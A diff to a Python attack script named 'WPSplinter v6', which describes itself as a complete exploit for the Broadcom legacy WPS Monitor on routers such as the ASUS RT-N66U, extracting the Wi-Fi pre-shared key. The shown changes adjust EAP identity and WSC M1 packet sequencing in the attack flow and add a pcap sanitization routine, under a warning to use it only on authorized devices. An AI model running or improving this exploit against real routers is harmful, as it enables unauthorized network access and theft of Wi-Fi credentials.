@@ -1,5 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+WPSplinter v6 - Complete exploit for Broadcom legacy WPS Monitor with PSK extraction
+(ap_eap_sm.c, pre-2018 patch lineage; verified against ASUS RT-N66U Merlin
+firmware $Id: ap_eap_sm.c 279189 2011-08-23, $Id: eapd.c 241391 2011-02-18).
+
+Use ONLY against devices you own or are explicitly authorized to test
+(German law: Sections 202a ff. StGB; do not probe third-party networks).
+"""
 
 import argparse
 import subprocess
@@ -222,10 +230,14 @@ class WPSplinter:
         self.tx_eapol(eapol_start)
         time.sleep(0.5)
         
+        # Increment EAP-ID for Identity Response
+        self.eap_id += 1
         identity_pkt = self.build_eap_identity(b"WFA-SimpleConfig-Enrollee-1-0", self.eap_id)
         self.tx_eapol(identity_pkt)
         time.sleep(0.5)
         
+        # Increment EAP-ID for WSC M1 probe (single transmission)
+        self.eap_id += 1
         probe_data = eapol_wrap(eap_wsc(EAP_CODE_RESPONSE, self.eap_id, WPS_OP_M1, 0x00,
                                         build_wsc_tlv(WPS_OP_M1), lf_total=0x0000))
         self.tx_eapol(probe_data)
@@ -526,11 +538,45 @@ class WPSplinter:
         self._log("[*] Verifying exploit success...")
         self._log("[i] Verification requires additional network monitoring")
     
-    def close(self):
-        """Cleanup"""
+
+
+    def sanitize_pcap(self, output_path):
+        """Sanitize captured packets"""
+        from scapy.all import wrpcap
+        import uuid, random
+        if not self.captured:
+            self._log("[i] No packets")
+            return False
+        self._log(f"[*] Sanitizing {len(self.captured)} packets...")
+        fake_bssid = ":".join(["%02x" % random.randint(0,255) for _ in range(6)])
+        fake_ssid = "SANITIZED_" + uuid.uuid4().hex[:8].upper()
+        spkts, stats = [], {"ssid":0, "serial":0, "uuid":0}
+        for pkt in self.captured:
+            spkt = pkt.copy()
+            if hasattr(spkt,"load") and isinstance(spkt.load,bytes):
+                pl = spkt.load
+                if isinstance(self.ssid,bytes):
+                    pl = pl.replace(self.ssid, fake_ssid.encode())
+                    stats["ssid"] += 1
+                import re
+                pl = re.sub(rb"[0-9a-fA-F]{10}", b"SNXXXXXX", pl)
+                stats["serial"] += 1
+                pl = re.sub(rb"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", b"0"*36, pl)
+                stats["uuid"] += 1
+                spkt.load = pl
+            spkts.append(spkt)
+        wrpcap(output_path, spkts)
+        self._log("[+] Sanitized PCAP saved")
+        return True
+
+    def close(self, sanitize=True):
+        """Cleanup with optional sanitization"""
         if self.dump and self.captured:
-            wrpcap(self.dump, self.captured)
-            self._log(f"[+] Captured packets saved to {self.dump}")
+            if sanitize:
+                self.sanitize_pcap(self.dump)
+            else:
+                wrpcap(self.dump, self.captured)
+                self._log(f"[+] Captured packets saved to {self.dump}")
 
 
 def main():
